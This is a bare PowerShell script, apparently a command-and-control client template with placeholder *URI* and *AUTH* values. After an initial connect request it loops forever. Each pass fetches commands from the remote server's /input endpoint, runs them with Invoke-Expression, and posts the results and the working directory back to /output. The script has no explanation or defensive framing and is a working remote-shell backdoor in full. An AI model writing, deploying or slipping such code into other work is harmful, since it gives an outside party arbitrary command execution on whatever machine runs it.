$uri = "*URI*";
$auth = "*AUTH*"
Invoke-WebRequest -UseBasicParsing -Headers @{"Authorization" = $auth} -Uri $uri/connect
while ($true) {
    $content = (Invoke-WebRequest -UseBasicParsing -Headers @{"Authorization" = $auth} -Uri $uri/input).Content;
    if ($content -ne "none") { 
        $command = Out-String -InputObject (iex $content -ErrorAction Stop -ErrorVariable command);
        $path = Out-String -InputObject (Resolve-Path .\).Path
        Invoke-WebRequest -UseBasicParsing -Headers @{"Authorization" = $auth} -Uri $uri/output -Method POST -ContentType "application/json" -Body (@{"Content" = $command; "Path" = $path} | ConvertTo-Json)
    }
    sleep 0.5
}